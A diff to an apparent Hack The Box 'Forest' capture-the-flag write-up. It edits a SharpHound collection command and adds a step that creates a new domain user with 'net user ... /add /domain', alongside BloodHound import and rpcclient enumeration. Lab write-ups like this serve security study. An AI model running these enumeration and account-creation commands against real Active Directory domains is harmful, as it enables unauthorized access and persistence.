@@ -259,9 +259,13 @@ rpcclient $> querygroup 0x47c
 
   - Execute SharpHound.exe on Forest (10.10.10.161)
 ```CSS
-▶ C:\> .\SharpHound.exe -c all
+C:\> .\SharpHound.exe -c all
 ```
   - Import `BloodHound.zip` to BloodHound.
   - Mark user `SVC-ALFRESCO@HTB.LOCAL` as owned.
 ![image](https://user-images.githubusercontent.com/83878909/231216827-1f4e7ae2-9738-49b8-affd-46d16113a566.png)
 
+  - Create a new user in the domain.
+```CSS
+C:\> net user random passwd123 /add /domain
+```
